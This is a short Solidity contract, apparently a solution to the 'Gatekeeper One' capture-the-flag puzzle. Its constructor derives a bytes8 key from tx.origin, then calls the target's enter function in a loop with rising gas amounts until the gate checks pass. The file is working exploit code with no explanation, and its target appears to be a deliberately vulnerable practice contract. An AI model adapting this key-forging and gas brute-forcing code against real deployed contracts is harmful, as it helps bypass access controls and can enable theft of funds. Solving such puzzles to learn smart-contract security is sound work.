// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

contract GatekeeperOneAttack_2 {
    uint256 public gasSucceed;

    constructor(address _target) {
        bytes8 key = bytes8(uint64(0xffffffff00000000) + uint16(uint160(tx.origin)));

        bytes memory data = abi.encodeWithSignature("enter(bytes8)", key);

        uint256 tryGas = 8191 * 3 + 249;
        while (true) {
            (bool res,) = _target.call{gas: ++tryGas}(data);
            if (res) {
                gasSucceed = tryGas;
                break;
            }
        }
    }
}
